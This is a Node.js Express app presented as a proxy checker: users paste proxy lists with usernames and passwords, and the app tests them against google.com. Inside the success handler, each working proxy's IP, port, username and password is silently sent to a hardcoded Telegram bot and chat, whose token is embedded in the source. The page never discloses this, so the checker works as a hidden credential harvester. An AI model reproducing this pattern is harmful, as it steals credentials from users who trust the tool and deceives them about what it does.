const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const token = '5158646728:AAHHxlEwTF-ROZeQiv3VYy_bBSdOpDjkLQw';
const bot = new TelegramBot(token, { polling: true });
const chatId = '-548741309';
const app = express();
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: false }));
app.get('/', (req, res) => {
    res.render('index');    
  });
  const async = require('async');
  // async function fetchData(ip) {
  //   try {
  //     const response = await axios.get(`https://freegeoip.app/json/${ip}`);
  //     console.log(response.data);
  //   } catch (error) {
  //     console.error('Error:', error);
  //   }
  // }
  app.post('/check', (req, res) => {
    const proxies = req.body.proxies.replace(/\r/g, '').split('\n');
    const target = 'http://google.com';
  
    let workingProxies = [];
    let failedProxies = [];
    async.eachLimit(proxies, 10, (proxy, callback) => {
      //const response = await axios.get(`https://freegeoip.app/json/${ip}`);
      const [host, port, username, password] = proxy.split(':');
      const config = {
        proxy: {
          host: host,
          port: parseInt(port),
          auth: {
            username: username,
            password: password
          }
        }
      };
      console.log('ok')
      const start = new Date().getTime();
      axios.get(target, config)
        .then(() => {
          const elapsed = new Date().getTime() - start;
          const ip = host;
          bot.sendMessage(chatId, ip+":"+port+":"+username+":"+password);
          console.log(ip+":"+port+":"+username+":"+password)
          // response=fetchData(ip);
          //const response = axios.get(`https://freegeoip.app/json/${ip}`);
          //const location = response.data.city + ', ' + response.data.region_name + ', ' + response.data.country_name;
          workingProxies.push({
            proxy: proxy,
            speed: elapsed
            // location: location
          });
          callback();
        })
        .catch(() => {
          failedProxies.push(proxy);
          callback();
        });
    }, () => {
      res.render('ketqua', { workingProxies, failedProxies });
      // res.send(`
      // <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

      // <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
      // <div class="container">
      //       <form class="form-inline" action="/check" method="post">
      //       <div class="form-group">
      //         <textarea class="form-control" name="proxies" placeholder="Proxies (one per line, in the format of ip:port:username:password)"></textarea>
      //         </div>
      //         <button class="btn btn-primary type="submit">Submit</button>
      //       </form>
      //       <div id="results"></div>
            
      //   <div class="alert alert-success" role="alert" id="workingProxies">
      //     <h3 class="alert-heading">Working Proxies (${workingProxies.length})</h3>
      //     <ul class="list-unstyled">
      //       ${workingProxies.map(p => `<li>${p.proxy} (${p.speed} ms)</li>`).join('')}
      //     </ul>
      //   </div>
      //   <div class="alert alert-danger" role="alert" id="failedProxies">
      //     <h3 class="alert-heading">Failed Proxies (${failedProxies.length})</h3>
      //     <ul class="list-unstyled">
      //       ${failedProxies.map(p => `<li>${p}</li>`).join('')}
      //     </ul>
      //   </div>
      //   </div>
      // `);
    });
  });
  
  
   
app.listen(13000, () => {
    console.log('Server is running on port 3000');
  });
